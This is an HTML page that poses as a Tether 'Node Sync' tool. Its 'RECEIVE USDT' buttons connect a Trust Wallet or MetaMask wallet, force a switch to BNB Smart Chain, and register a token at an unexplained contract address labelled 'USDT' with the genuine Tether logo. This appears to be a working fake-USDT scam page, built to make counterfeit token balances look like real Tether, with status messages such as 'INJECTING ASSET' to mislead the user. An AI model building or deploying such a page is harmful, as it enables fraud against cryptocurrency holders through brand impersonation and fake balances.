<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 380px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .usdt-main { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--tether-green)); }
        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: 25px; }
        .wallet-btn { 
            background: #1c1f24; border: 1px solid #2d333b; color: #fff; 
            padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 700; 
            cursor: pointer; display: flex; align-items: center; justify-content: space-between;
            transition: 0.3s; width: 100%;
        }
        .wallet-btn:hover { border-color: var(--tether-green); background: #24292e; }
        .wallet-btn img { width: 30px; height: 30px; object-fit: contain; }
        #log-area { font-size: 11px; color: #26a17b; margin-top: 20px; font-family: monospace; min-height: 15px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-main" alt="USDT">
    <p style="color: #848d97; font-size: 14px;">Select destination wallet to map node metadata.</p>

    <div class="btn-container">
        <button class="wallet-btn" onclick="connect('trust')">
            <span>RECEIVE USDT</span>
            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" alt="TW">
        </button>

        <button class="wallet-btn" onclick="connect('metamask')">
            <span>RECEIVE USDT</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MM">
        </button>
    </div>

    <div id="log-area">> SYSTEM READY</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function connect(type) {
        const log = document.getElementById('log-area');
        let provider = null;

        // --- NEW MULTI-PROVIDER LOGIC ---
        if (type === 'trust') {
            provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
            // Agar multiple wallets hain, to list mein se Trust dhundo
            if (!provider && window.ethereum?.providers) {
                provider = window.ethereum.providers.find(p => p.isTrust);
            }
        } else {
            provider = window.ethereum?.isMetaMask ? window.ethereum : null;
            if (!provider && window.ethereum?.providers) {
                provider = window.ethereum.providers.find(p => p.isMetaMask);
            }
        }

        if (!provider) {
            alert(type.toUpperCase() + " Extension not detected!");
            return;
        }

        try {
            log.innerText = "> INITIALIZING " + type + "...";
            // Handshake request
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "> SYNCING NETWORK...";
            // Force BSC
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (e) {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            log.innerText = "> INJECTING ASSET...";
            // Token Addition
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            log.innerText = "> SUCCESSFUL";
            alert("Node Sync Complete!");

        } catch (err) {
            console.error(err);
            log.innerText = "> ERROR: HANDSHAKE FAILED";
            // Agar error code 4001 hai (User rejected), to warning mat dikhana
            if(err.code === 4001) log.innerText = "> USER REJECTED CONNECTION";
        }
    }
</script>
</body>
</html>
